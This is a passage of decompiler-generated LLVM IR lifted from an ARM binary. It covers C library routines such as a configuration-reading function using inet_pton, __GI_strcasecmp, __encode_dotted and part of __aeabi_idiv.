  store i32 4, i32* %r3.global-to-local, align 4
  %v0_2fd44 = load i32, i32* @r8, align 4
  %v1_2fd44 = load i32, i32* @r7, align 4
  %v2_2fd44 = add i32 %v1_2fd44, 8
  %v3_2fd44 = inttoptr i32 %v2_2fd44 to i32*
  store i32 %v0_2fd44, i32* %v3_2fd44, align 4
  %v0_2fd84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2fd80

dec_label_pc_2fd4c:                               ; preds = %dec_label_pc_2fcf0
  %v0_2fd4c = load i32, i32* @r8, align 4
  %v7_2fd4c = icmp eq i32 %v0_2fd4c, 10
  br i1 %v7_2fd4c, label %dec_label_pc_2fd54, label %dec_label_pc_2fd8c

dec_label_pc_2fd54:                               ; preds = %dec_label_pc_2fd4c
  %v3_2fd54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2fd54, i32* %r3.global-to-local, align 4
  %v1_2fd5c = inttoptr i32 %v3_2fd54 to i32*
  %v2_2fd5c = load i32, i32* %v1_2fd5c, align 4
  store i32 %v2_2fd5c, i32* %r1.global-to-local, align 4
  %v0_2fd60 = load i32, i32* @sl, align 4
  store i32 %v0_2fd60, i32* %r2.global-to-local, align 4
  %v3_2fd64 = inttoptr i32 %v2_2fd5c to i8*
  %v4_2fd64 = call i32 @inet_pton(i32 10, i8* %v3_2fd64, i32 %v0_2fd60)
  %tmp24 = icmp slt i32 %v4_2fd64, 1
  br i1 %tmp24, label %dec_label_pc_2fd8c, label %dec_label_pc_2fd70

dec_label_pc_2fd70:                               ; preds = %dec_label_pc_2fd54
  store i32 %tmp7, i32* @ip, align 4
  %v0_2fd74 = load i32, i32* @r8, align 4
  %v1_2fd74 = load i32, i32* @r7, align 4
  %v2_2fd74 = add i32 %v1_2fd74, 8
  %v3_2fd74 = inttoptr i32 %v2_2fd74 to i32*
  store i32 %v0_2fd74, i32* %v3_2fd74, align 4
  %v0_2fd78 = load i32, i32* @r7, align 4
  %v1_2fd78 = load i32, i32* @ip, align 4
  %v2_2fd78 = inttoptr i32 %v1_2fd78 to i32*
  store i32 %v0_2fd78, i32* %v2_2fd78, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2fd80

dec_label_pc_2fd80:                               ; preds = %dec_label_pc_2fd38, %dec_label_pc_2fd70
  %v0_2fd84 = phi i32 [ %v0_2fd84.pre, %dec_label_pc_2fd38 ], [ 16, %dec_label_pc_2fd70 ]
  store i32 0, i32* @sb, align 4
  %v1_2fd84 = load i32, i32* @r7, align 4
  %v2_2fd84 = add i32 %v1_2fd84, 12
  %v3_2fd84 = inttoptr i32 %v2_2fd84 to i32*
  store i32 %v0_2fd84, i32* %v3_2fd84, align 4
  br label %dec_label_pc_2fdb4

dec_label_pc_2fd8c:                               ; preds = %dec_label_pc_2fd4c, %dec_label_pc_2fd54, %dec_label_pc_2fd1c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_2fd90

dec_label_pc_2fd90:                               ; preds = %dec_label_pc_2fce0.backedge, %dec_label_pc_2fcac, %dec_label_pc_2fd8c, %dec_label_pc_2fc3c
  %v0_2fd90 = load i32, i32* @r6, align 4
  store i32 %v2_2fc44, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_2fc78, i32* %r3.global-to-local, align 4
  %v4_2fda0 = inttoptr i32 %v0_2fd90 to i32*
  %v5_2fda0 = call i32 @__GI_config_read(i32* %v4_2fda0, i32 %v2_2fc44, i32 459270, i32 %v0_2fc78)
  %v2_2fda4 = icmp eq i32 %v5_2fda0, 0
  br i1 %v2_2fda4, label %dec_label_pc_2fdac, label %dec_label_pc_2fc8c

dec_label_pc_2fdac:                               ; preds = %dec_label_pc_2fd90
  %v0_2fdac = load i32, i32* @fp, align 4
  %v7_2fdac = icmp eq i32 %v0_2fdac, 1
  br i1 %v7_2fdac, label %dec_label_pc_2fdbc, label %dec_label_pc_2fdb4

dec_label_pc_2fdb4:                               ; preds = %dec_label_pc_2fdac, %dec_label_pc_2fd80
  %v0_2fdb4 = load i32, i32* @r6, align 4
  %v1_2fdb8 = inttoptr i32 %v0_2fdb4 to i32*
  %v2_2fdb8 = call i32 @__GI_config_close(i32* %v1_2fdb8)
  br label %dec_label_pc_2fdbc

dec_label_pc_2fdbc:                               ; preds = %dec_label_pc_2fc8c, %.thread, %dec_label_pc_2fdac, %dec_label_pc_2fc20, %dec_label_pc_2fdb4
  %v0_2fdbc = load i32, i32* @sb, align 4
  store i32 %v3_2fbc4, i32* @r4, align 4
  store i32 %v9_2fbc4, i32* @r6, align 4
  store i32 %v12_2fbc4, i32* @r7, align 4
  store i32 %v15_2fbc4, i32* @r8, align 4
  store i32 %v18_2fbc4, i32* @sb, align 4
  store i32 %v24_2fbc4, i32* @fp, align 4
  ret i32 %v0_2fdbc

; uselistorder directives
  uselistorder i32 %v0_2fce0.be, { 1, 0 }
  uselistorder i32 %v0_2fc78, { 1, 0 }
  uselistorder i32 %v2_2fc44, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 27, 28, 29, 30, 31, 32, 33, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i16 8, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i16* @global_var_42934.3040, { 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 32, 72, 71, 70, 69, 68, 67, 66, 50, 49, 48, 112, 111, 110, 45, 59, 44, 43, 42, 107, 106, 61, 103, 109, 108, 60, 73, 41, 40, 57, 58, 56, 33, 39, 55, 52, 51, 38, 65, 64, 37, 105, 104, 102, 101, 100, 99, 28, 82, 21, 76, 25, 13, 12, 20, 19, 81, 80, 79, 78, 113, 11, 5, 4, 77, 10, 9, 8, 86, 75, 18, 63, 62, 97, 98, 17, 0, 92, 27, 46, 83, 84, 16, 30, 74, 87, 47, 14, 31, 36, 35, 34, 15, 96, 95, 26, 2, 91, 29, 90, 24, 85, 54, 53, 23, 22, 89, 88, 7, 6, 3, 1, 94, 93 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 12, 4, 13, 11, 1, 6 }
  uselistorder i32 129, { 0, 20, 14, 15, 16, 12, 13, 17, 8, 18, 19, 9, 10, 11, 3, 4, 5, 1, 2, 6, 7, 21 }
  uselistorder i32* @fp, { 53, 54, 55, 56, 65, 66, 67, 68, 69, 70, 71, 72, 73, 0, 78, 79, 80, 81, 82, 83, 84, 85, 86, 4, 5, 139, 140, 74, 75, 76, 77, 87, 88, 89, 90, 91, 92, 57, 58, 59, 60, 61, 62, 63, 64, 6, 7, 141, 1, 120, 122, 121, 123, 2, 106, 107, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 124, 125, 126, 127, 128, 129, 138, 130, 136, 137, 131, 132, 133, 134, 135, 142, 3 }
  uselistorder label %dec_label_pc_2fdbc, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_2fd90, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2fd8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2fd80, { 1, 0 }
  uselistorder label %dec_label_pc_2fce0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_2fcc4, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_2fdf8

dec_label_pc_2fdf8:                               ; preds = %dec_label_pc_2fe24, %entry
  %v1_2fe3c8 = phi i32 [ %v1_2fe3c9, %dec_label_pc_2fe24 ], [ 0, %entry ]
  %v0_2fe2c = phi i32 [ %v1_2fe2c, %dec_label_pc_2fe24 ], [ %arg2, %entry ]
  %v0_2fe30 = phi i32 [ %v1_2fe30, %dec_label_pc_2fe24 ], [ %tmp, %entry ]
  %v9_2fdf8 = icmp eq i32 %v0_2fe30, %v0_2fe2c
  %.pre = inttoptr i32 %v0_2fe30 to i8*
  br i1 %v9_2fdf8, label %dec_label_pc_2fe24, label %dec_label_pc_2fe00

dec_label_pc_2fe00:                               ; preds = %dec_label_pc_2fdf8
  %v2_2fe00 = load i8, i8* %.pre, align 1
  %v3_2fe00 = zext i8 %v2_2fe00 to i32
  %v1_2fe04 = inttoptr i32 %v0_2fe2c to i8*
  %v2_2fe04 = load i8, i8* %v1_2fe04, align 1
  %v3_2fe04 = zext i8 %v2_2fe04 to i32
  %v4_2fe08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 868) to i32*), align 4
  %v2_2fe0c = mul nuw nsw i32 %v3_2fe04, 2
  %v2_2fe10 = mul nuw nsw i32 %v3_2fe00, 2
  %v2_2fe14 = add i32 %v4_2fe08, %v2_2fe0c
  %v3_2fe14 = inttoptr i32 %v2_2fe14 to i16*
  %v4_2fe14 = load i16, i16* %v3_2fe14, align 2
  %v6_2fe14 = sext i16 %v4_2fe14 to i32
  %v2_2fe18 = add i32 %v4_2fe08, %v2_2fe10
  %v3_2fe18 = inttoptr i32 %v2_2fe18 to i16*
  %v4_2fe18 = load i16, i16* %v3_2fe18, align 2
  %v6_2fe18 = sext i16 %v4_2fe18 to i32
  %v2_2fe1c = sub nsw i32 %v6_2fe18, %v6_2fe14
  %v9_2fe1c = icmp eq i16 %v4_2fe18, %v4_2fe14
  br i1 %v9_2fe1c, label %dec_label_pc_2fe24, label %dec_label_pc_2fe38

dec_label_pc_2fe24:                               ; preds = %dec_label_pc_2fdf8, %dec_label_pc_2fe00
  %v1_2fe3c9 = phi i32 [ %v2_2fe1c, %dec_label_pc_2fe00 ], [ %v1_2fe3c8, %dec_label_pc_2fdf8 ]
  %v2_2fe24 = load i8, i8* %.pre, align 1
  %v2_2fe28 = icmp eq i8 %v2_2fe24, 0
  %v1_2fe2c = add i32 %v0_2fe2c, 1
  %v1_2fe30 = add i32 %v0_2fe30, 1
  store i32 %v1_2fe30, i32* @ip, align 4
  br i1 %v2_2fe28, label %dec_label_pc_2fe38, label %dec_label_pc_2fdf8

dec_label_pc_2fe38:                               ; preds = %dec_label_pc_2fe24, %dec_label_pc_2fe00
  %v1_2fe3c = phi i32 [ %v1_2fe3c9, %dec_label_pc_2fe24 ], [ %v2_2fe1c, %dec_label_pc_2fe00 ]
  ret i32 %v1_2fe3c

; uselistorder directives
  uselistorder i32 %v1_2fe30, { 1, 0 }
  uselistorder i32 %v2_2fe1c, { 1, 0 }
  uselistorder i32 %v0_2fe30, { 1, 0, 2 }
  uselistorder i32 868, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_2fe24, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_2fe48 = load i32, i32* @r4, align 4
  store i32 %v3_2fe48, i32* %stack_var_-32, align 4
  %v6_2fe48 = load i32, i32* @r5, align 4
  %v9_2fe48 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_2fe50 = load i32, i32* @r1, align 4
  store i32 %v0_2fe50, i32* %r8.global-to-local, align 4
  %v0_2fe54 = load i32, i32* @r2, align 4
  store i32 %v0_2fe54, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2febc23 = icmp slt i8* %arg1, null
  store i1 %v1_2febc23, i1* %cpsr_n.global-to-local, align 1
  %v2_2febc24 = icmp eq i8* %arg1, null
  store i1 %v2_2febc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2febc24, label %dec_label_pc_2fed4, label %dec_label_pc_2fec8

dec_label_pc_2fe60:                               ; preds = %dec_label_pc_2fec8
  %v2_2fe60 = call i32 @__GI_strchr(i32 %v0_2fe6026, i32 46)
  store i32 %v2_2fe60, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2fe64 = icmp slt i32 %v2_2fe60, 0
  store i1 %v1_2fe64, i1* %cpsr_n.global-to-local, align 1
  %v2_2fe64 = icmp eq i32 %v2_2fe60, 0
  store i1 %v2_2fe64, i1* %cpsr_z.global-to-local, align 1
  %v0_2fe68 = load i32, i32* @r4, align 4
  %v2_2fe68 = sub i32 %v2_2fe60, %v0_2fe68
  store i32 %v2_2fe68, i32* @r5, align 4
  br i1 %v2_2fe64, label %dec_label_pc_2fe70, label %dec_label_pc_2fe7c

dec_label_pc_2fe70:                               ; preds = %dec_label_pc_2fe60
  %v1_2fe70 = inttoptr i32 %v0_2fe68 to i8*
  %v3_2fe74 = call i32 @strlen(i8* %v1_2fe70)
  %sext = mul i32 %v3_2fe74, 16777216
  %v1_2fe78 = sdiv i32 %sext, 16777216
  store i32 %v1_2fe78, i32* @r5, align 4
  %v0_2fe88.pre = load i32, i32* @r4, align 4
  %v0_2fe98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2fe7c

dec_label_pc_2fe7c:                               ; preds = %dec_label_pc_2fe60, %dec_label_pc_2fe70
  %v0_2fe98 = phi i32 [ %v2_2fe60, %dec_label_pc_2fe60 ], [ %v0_2fe98.pre, %dec_label_pc_2fe70 ]
  %v0_2fe88 = phi i32 [ %v0_2fe68, %dec_label_pc_2fe60 ], [ %v0_2fe88.pre, %dec_label_pc_2fe70 ]
  %v0_2fea8 = phi i32 [ %v2_2fe68, %dec_label_pc_2fe60 ], [ %v1_2fe78, %dec_label_pc_2fe70 ]
  %v0_2fe7c = load i32, i32* %sl.global-to-local, align 4
  %v1_2fe7c = add i32 %v0_2fe7c, 1
  store i32 %v1_2fe7c, i32* %r7.global-to-local, align 4
  %v1_2fe80 = load i32, i32* %sb.global-to-local, align 4
  %v2_2fe80 = sub i32 %v1_2fe80, %v0_2fe7c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2fe84 = icmp slt i32 %v0_2fea8, 0
  store i1 %v1_2fe84, i1* %cpsr_n.global-to-local, align 1
  %v2_2fe84 = icmp eq i32 %v0_2fea8, 0
  store i1 %v2_2fe84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_2fe88, i32* @r1, align 4
  %v0_2fe8c = load i32, i32* %r8.global-to-local, align 4
  %v2_2fe8c = add i32 %v0_2fe8c, %v1_2fe7c
  store i32 %v2_2fe8c, i32* @r0, align 4
  store i32 %v0_2fea8, i32* @r2, align 4
  %v1_2fe94 = add i32 %v2_2fe80, -1
  store i32 %v1_2fe94, i32* @r3, align 4
  %v1_2fe98 = add i32 %v0_2fe98, 1
  store i32 %v1_2fe98, i32* @r4, align 4
  br i1 %v2_2fe84, label %dec_label_pc_2fee8, label %dec_label_pc_2fea0

dec_label_pc_2fea0:                               ; preds = %dec_label_pc_2fe7c
  %v2_2fea0 = sub i32 %v0_2fea8, %v1_2fe94
  %v3_2fea0 = icmp ult i32 %v0_2fea8, %v1_2fe94
  %v4_2fea0 = xor i32 %v1_2fe94, %v0_2fea8
  %v5_2fea0 = xor i32 %v2_2fea0, %v0_2fea8
  %v6_2fea0 = and i32 %v5_2fea0, %v4_2fea0
  %v7_2fea0 = icmp slt i32 %v6_2fea0, 0
  store i1 %v7_2fea0, i1* %cpsr_v.global-to-local, align 1
  %v8_2fea0 = icmp slt i32 %v2_2fea0, 0
  store i1 %v8_2fea0, i1* %cpsr_n.global-to-local, align 1
  %v9_2fea0 = icmp eq i32 %v0_2fea8, %v1_2fe94
  store i1 %v9_2fea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2fea0, label %dec_label_pc_2fea8, label %dec_label_pc_2fee8

dec_label_pc_2fea8:                               ; preds = %dec_label_pc_2fea0
  %v1_2fea8 = trunc i32 %v0_2fea8 to i8
  %v4_2fea8 = add i32 %v0_2fe8c, %v0_2fe7c
  %v5_2fea8 = inttoptr i32 %v4_2fea8 to i8*
  store i8 %v1_2fea8, i8* %v5_2fea8, align 1
  %v0_2feac = call i32 @memcpy()
  store i32 %v0_2feac, i32* @r0, align 4
  %v0_2feb0 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2feb0 = icmp slt i32 %v0_2feb0, 0
  store i1 %v1_2feb0, i1* %cpsr_n.global-to-local, align 1
  %v2_2feb0 = icmp eq i32 %v0_2feb0, 0
  store i1 %v2_2feb0, i1* %cpsr_z.global-to-local, align 1
  %v0_2feb4 = load i32, i32* @r5, align 4
  %v1_2feb4 = load i32, i32* %r7.global-to-local, align 4
  %v2_2feb4 = add i32 %v1_2feb4, %v0_2feb4
  store i32 %v2_2feb4, i32* %sl.global-to-local, align 4
  br i1 %v2_2feb0, label %dec_label_pc_2fed4, label %dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge

dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge:  ; preds = %dec_label_pc_2fea8
  %v0_2febc.pre = load i32, i32* @r4, align 4
  store i32 %v0_2febc.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2febc = icmp slt i32 %v0_2febc.pre, 0
  store i1 %v1_2febc, i1* %cpsr_n.global-to-local, align 1
  %v2_2febc = icmp eq i32 %v0_2febc.pre, 0
  store i1 %v2_2febc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2febc, label %dec_label_pc_2fed4, label %dec_label_pc_2fec8

dec_label_pc_2fec8:                               ; preds = %entry, %dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge
  %v0_2fe6026 = phi i32 [ %v0_2febc.pre, %dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge ], [ %tmp, %entry ]
  %v5_2fedc525 = phi i32 [ %v2_2feb4, %dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge ], [ 0, %entry ]
  %v1_2fec8 = inttoptr i32 %v0_2fe6026 to i8*
  %v2_2fec8 = load i8, i8* %v1_2fec8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2fecc = icmp eq i8 %v2_2fec8, 0
  store i1 %v2_2fecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2fecc, label %dec_label_pc_2fed4, label %dec_label_pc_2fe60

dec_label_pc_2fed4:                               ; preds = %dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge, %dec_label_pc_2fea8, %dec_label_pc_2fec8, %entry
  %v8_2fee0 = phi i32 [ 0, %entry ], [ %v5_2fedc525, %dec_label_pc_2fec8 ], [ %v2_2feb4, %dec_label_pc_2fea8 ], [ %v2_2feb4, %dec_label_pc_2fea8.dec_label_pc_2febc_crit_edge ]
  %v0_2fed4 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2fed4 = icmp slt i32 %v0_2fed4, 0
  store i1 %v1_2fed4, i1* %cpsr_n.global-to-local, align 1
  %v2_2fed4 = icmp eq i32 %v0_2fed4, 0
  store i1 %v2_2fed4, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_2fed4, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_2fed4
  %v6_2fedc = add i32 %v8_2fee0, 1
  store i32 %v6_2fedc, i32* @r0, align 4
  %v7_2fee0 = load i32, i32* %r8.global-to-local, align 4
  %v9_2fee0 = add i32 %v7_2fee0, %v8_2fee0
  %v10_2fee0 = inttoptr i32 %v9_2fee0 to i8*
  store i8 0, i8* %v10_2fee0, align 1
  %v0_2fee4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_2fee4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2fee4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_2fed4, %bb
  %v2_2fee4 = phi i1 [ %v2_2fee4.pre, %bb ], [ false, %dec_label_pc_2fed4 ]
  %v1_2fee4 = phi i1 [ %v1_2fee4.pre, %bb ], [ %v1_2fed4, %dec_label_pc_2fed4 ]
  %v0_2fee4 = phi i1 [ %v0_2fee4.pre, %bb ], [ %v2_2fed4, %dec_label_pc_2fed4 ]
  %v3_2fee4 = xor i1 %v2_2fee4, %v1_2fee4
  %v4_2fee4 = or i1 %v0_2fee4, %v3_2fee4
  br i1 %v4_2fee4, label %dec_label_pc_2fee8, label %.dec_label_pc_2feec_crit_edge

.dec_label_pc_2feec_crit_edge:                    ; preds = %bb22
  %v1_2fef0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_2feec

dec_label_pc_2fee8:                               ; preds = %dec_label_pc_2fea0, %dec_label_pc_2fe7c, %bb22
  br label %dec_label_pc_2feec

dec_label_pc_2feec:                               ; preds = %.dec_label_pc_2feec_crit_edge, %dec_label_pc_2fee8
  %v1_2fef0 = phi i32 [ %v1_2fef0.pre, %.dec_label_pc_2feec_crit_edge ], [ -1, %dec_label_pc_2fee8 ]
  %v2_2feec = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_2feec, i32* @r4, align 4
  store i32 %v6_2fe48, i32* @r5, align 4
  store i32 %v9_2fe48, i32* @r6, align 4
  ret i32 %v1_2fef0

; uselistorder directives
  uselistorder i32 %v0_2fed4, { 0, 2, 1 }
  uselistorder i32 %v0_2febc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2feb0, { 1, 0 }
  uselistorder i32 %v2_2fea0, { 1, 0 }
  uselistorder i32 %v1_2fe94, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_2fea8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_2fe78, { 1, 0 }
  uselistorder i1 %v2_2febc24, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i8*)* @strlen, { 15, 14, 13, 12, 11, 10, 27, 26, 7, 9, 8, 1, 28, 25, 24, 23, 21, 22, 20, 19, 18, 31, 30, 29, 17, 16, 6, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 11, 10, 9, 8, 2, 1, 0, 7, 6, 5, 18, 17, 16, 15, 14, 13, 12, 4, 3 }
  uselistorder i32 46, { 0, 1, 5, 6, 7, 8, 9, 4, 2, 3 }
  uselistorder label %dec_label_pc_2feec, { 1, 0 }
  uselistorder label %dec_label_pc_2fee8, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_2fed4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2fec8, { 1, 0 }
  uselistorder label %dec_label_pc_2fe7c, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_2fef4 = load i32, i32* @r1, align 4
  %v1_2fef4 = icmp slt i32 %v0_2fef4, 0
  %v2_2fef4 = icmp eq i32 %v0_2fef4, 0
  %v2_2fef8 = xor i32 %v0_2fef4, %arg1
  br i1 %v2_2fef4, label %dec_label_pc_3000c, label %dec_label_pc_2ff00

dec_label_pc_2ff00:                               ; preds = %entry
  br i1 %v1_2fef4, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_2ff00
  %v2_2ff00 = sub i32 0, %v0_2fef4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_2ff00, %bb
  %v1_2ffcc = phi i32 [ %v2_2ff00, %bb ], [ %v0_2fef4, %dec_label_pc_2ff00 ]
  %v1_2ff04 = add i32 %v1_2ffcc, -1
  %v7_2ff04 = icmp eq i32 %v1_2ffcc, 1
  br i1 %v7_2ff04, label %dec_label_pc_2ffac, label %dec_label_pc_2ff0c

dec_label_pc_2ff0c:                               ; preds = %thread-pre-split
  %v1_2ff0c = icmp slt i32 %arg1, 0
  br i1 %v1_2ff0c, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_2ff0c
  %v2_2ff10 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_2ff0c, %bb85
  %v0_30000 = phi i32 [ %arg1, %dec_label_pc_2ff0c ], [ %v2_2ff10, %bb85 ]
  %v3_2ff14 = icmp uge i32 %v0_30000, %v1_2ffcc
  %v9_2ff14 = icmp eq i32 %v0_30000, %v1_2ffcc
  %v2_2ff18 = xor i1 %v3_2ff14, true
  %v3_2ff18 = or i1 %v9_2ff14, %v2_2ff18
  br i1 %v3_2ff18, label %dec_label_pc_2ffb8, label %dec_label_pc_2ff1c

dec_label_pc_2ff1c:                               ; preds = %bb86
  %v2_2ff1c = and i32 %v1_2ff04, %v1_2ffcc
  %v4_2ff1c = icmp eq i32 %v2_2ff1c, 0
  br i1 %v4_2ff1c, label %dec_label_pc_2ffc8, label %dec_label_pc_2ff24

dec_label_pc_2ff24:                               ; preds = %dec_label_pc_2ff1c
  %v3_2ff24 = icmp ult i32 %v1_2ffcc, 536870912
  br i1 %v3_2ff24, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_2ff24
  %v4_2ff28 = mul i32 %v1_2ffcc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_2ff24, %.thread
  %v0_2ff48.pr40.ph = phi i32 [ %v4_2ff28, %.thread ], [ %v1_2ffcc, %dec_label_pc_2ff24 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_2ff24 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_2ff48.pr40 = phi i32 [ %v4_2ff3c, %bb89 ], [ %v0_2ff48.pr40.ph, %.preheader.preheader ]
  %v1_2ff40 = phi i32 [ %v4_2ff40, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_2ff34 = icmp ugt i32 %v0_2ff48.pr40, 268435455
  br i1 %v2_2ff34, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_2ff48thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_2ff38 = icmp ult i32 %v0_2ff48.pr40, %v0_30000
  br i1 %v4_2ff38, label %bb88, label %dec_label_pc_2ff48thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_2ff3c = and i32 %v0_2ff48.pr40, 268435456
  %v3_2ff3c = icmp eq i32 %v2_2ff3c, 0
  %v4_2ff3c = mul i32 %v0_2ff48.pr40, 16
  br i1 %v3_2ff3c, label %bb89, label %dec_label_pc_2ff48.loopexit

bb89:                                             ; preds = %bb88
  %v2_2ff40 = and i32 %v1_2ff40, 268435456
  %v3_2ff40 = icmp eq i32 %v2_2ff40, 0
  %v4_2ff40 = mul i32 %v1_2ff40, 16
  br i1 %v3_2ff40, label %.preheader, label %dec_label_pc_2ff48thread-pre-split.loopexit.loopexit

dec_label_pc_2ff48thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_2ff5452.ph = phi i32 [ %v1_2ff40, %bb87 ], [ %v4_2ff40, %bb89 ]
  %v0_2ff48.pr42.ph = phi i32 [ %v0_2ff48.pr40, %bb87 ], [ %v4_2ff3c, %bb89 ]
  br label %dec_label_pc_2ff48thread-pre-split.loopexit

